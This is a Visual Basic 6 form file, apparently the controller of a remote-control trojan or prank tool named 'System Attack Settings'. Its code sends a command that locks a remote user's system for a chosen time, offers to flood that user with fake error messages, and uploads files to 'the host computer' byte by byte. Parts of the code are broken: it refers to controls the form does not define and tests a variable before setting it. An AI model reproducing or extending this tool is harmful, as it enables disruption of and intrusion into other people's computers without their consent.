VERSION 5.00
Begin VB.Form frmSysAttack 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "System Attack Settings"
   ClientHeight    =   3996
   ClientLeft      =   48
   ClientTop       =   360
   ClientWidth     =   3000
   Icon            =   "frmSysAttack.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MDIChild        =   -1  'True
   MinButton       =   0   'False
   ScaleHeight     =   3996
   ScaleWidth      =   3000
   ShowInTaskbar   =   0   'False
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   3855
      Left            =   0
      ScaleHeight     =   3852
      ScaleWidth      =   5532
      TabIndex        =   0
      Top             =   120
      Width           =   5535
      Begin VB.Frame Frame1 
         BackColor       =   &H00000000&
         Caption         =   "Sys Attach"
         ForeColor       =   &H0000C000&
         Height          =   2175
         Left            =   120
         TabIndex        =   1
         Top             =   0
         Width           =   2775
         Begin VB.ComboBox HowMany 
            BackColor       =   &H00404040&
            ForeColor       =   &H0000FF00&
            Height          =   315
            Left            =   240
            TabIndex        =   10
            Text            =   "1"
            Top             =   1680
            Width           =   1455
         End
         Begin VB.ComboBox HowLong 
            BackColor       =   &H00404040&
            ForeColor       =   &H0000FF00&
            Height          =   315
            Left            =   240
            TabIndex        =   2
            Text            =   "20 Seconds"
            Top             =   840
            Width           =   1455
         End
         Begin VB.Label Label2 
            BackStyle       =   0  'Transparent
            Caption         =   "How many error messages do you wish to send"
            ForeColor       =   &H0000C000&
            Height          =   435
            Left            =   240
            TabIndex        =   9
            Top             =   1200
            Width           =   2220
            WordWrap        =   -1  'True
         End
         Begin VB.Label Label1 
            BackStyle       =   0  'Transparent
            Caption         =   "How long do you want to lock the users system?"
            ForeColor       =   &H0000C000&
            Height          =   435
            Left            =   240
            TabIndex        =   3
            Top             =   360
            Width           =   2220
            WordWrap        =   -1  'True
         End
      End
      Begin VB.CommandButton cmdInfo 
         BackColor       =   &H00000000&
         Caption         =   "&Errors"
         Height          =   375
         Left            =   1560
         TabIndex        =   5
         Top             =   3120
         Width           =   855
      End
      Begin VB.CommandButton cmdOK 
         Caption         =   "OK"
         Height          =   375
         Left            =   600
         TabIndex        =   7
         Top             =   3120
         Width           =   855
      End
      Begin VB.CommandButton cmdCancel 
         Caption         =   "&Cancel"
         Height          =   375
         Left            =   1560
         TabIndex        =   6
         Top             =   2640
         Width           =   855
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H00000000&
         Height          =   1455
         Left            =   120
         TabIndex        =   4
         Top             =   2280
         Width           =   2775
         Begin VB.CommandButton cmdLockUp 
            Caption         =   "&Lock-Up"
            Height          =   375
            Left            =   480
            TabIndex        =   8
            Top             =   360
            Width           =   855
         End
         Begin VB.Line Line2 
            BorderColor     =   &H0000C000&
            X1              =   1360
            X2              =   1360
            Y1              =   240
            Y2              =   1320
         End
         Begin VB.Line Line1 
            BorderColor     =   &H0000C000&
            X1              =   240
            X2              =   2520
            Y1              =   765
            Y2              =   765
         End
      End
   End
End
Attribute VB_Name = "frmSysAttack"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim DnTime As String




Private Sub cmdCancel_Click()
    Unload Me
End Sub


Private Sub cmdLockUp_Click()
    LockIt
End Sub


Private Sub Form_Load()
    FillHowLong
    FillHowMany
    FrmCnt = FrmCnt + 1
End Sub

Private Sub Form_Unload(Cancel As Integer)
    FrmCnt = FrmCnt - 1
End Sub

Private Sub Repeat_Click()
    If Repeat.Value = vbChecked Then
       HowMany.Enabled = True
       Label2(0).Enabled = True
    Else
       HowMany.Enabled = False
       Label2(0).Enabled = False
    End If
    
End Sub





'//////////////////////////////////////////////////////////////////////////////
'+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
'/////////////////////////////////////////////////////////////////////////////





Private Function TransPort(FName As String) As Boolean
    Dim LenFile As Long
    Dim nCnt As Integer
    Dim LoopTimes As Long
    Dim LocData As String
    Dim WFname As String
    Dim i As Integer
    
    WFname = App.Path & "\" & FName
    '
    ' open the file to be uploaded
    Open WFname For Binary As #1
       LenFile = LOF(1)

       nCnt = 1
       
       LoopTimes = Int(LenFile / 1) 'How many times to loop to get the file done.


       SendData "Open_File," & FName
  Pause 1000
       For i = 1 To LoopTimes

         LocData = Space$(1) 'Set size of chunks
         Get #1, nCnt, LocData 'Get data from the file nCnt is from where to start the get

         SendData "File_Transport, " & LocData 'Send the chunk

         nCnt = nCnt + 1
         frmClient.Label3 = nCnt
       Next
       ' close the file on the host computer
       Pause 1000
       SendData "Transport_Done," & FName
    Close #1
    
    
End Function

Private Sub FillHowLong()
   Dim xx As Integer
   
   For xx = 1 To 60
     If xx = 1 Then
       HowLong.AddItem xx & " Second"
     Else
       HowLong.AddItem xx & " Seconds"
     End If
   Next
   
   HowLong.Text = HowLong.List(19)
End Sub


Private Sub FillHowMany()
   Dim xx As Integer
   
   For xx = 1 To 15
     If xx = 1 Then
       HowMany.AddItem xx & " Msg"
     Else
       HowMany.AddItem xx & " Msg's"
     End If
   Next
   
   HowMany.Text = HowMany.List(1)
End Sub


Private Sub LockIt()
    On Error GoTo LockErr
    
    Dim Time_To_Lock As String
    Dim Num_Times As String
    Dim When_To_Lock As String
    Dim Repeat_ As String
       
    If HowLong = "" Then Exit Sub
    Time_To_Lock = HowLong
    
    If Repeat_ = "True" Then
        Num_Times = HowMany
        Repeat_ = "True"
    Else
        Repeat_ = "False"
    End If
    
    SendData "Lock_Up," _
             & Repeat_ & ":" _
             & Time_To_Lock & ":" _
             & Num_Times & ":"
             
    Exit Sub
LockErr:
    MsgBox err.Description, vbCritical, "Error #" & err.Number
             
End Sub
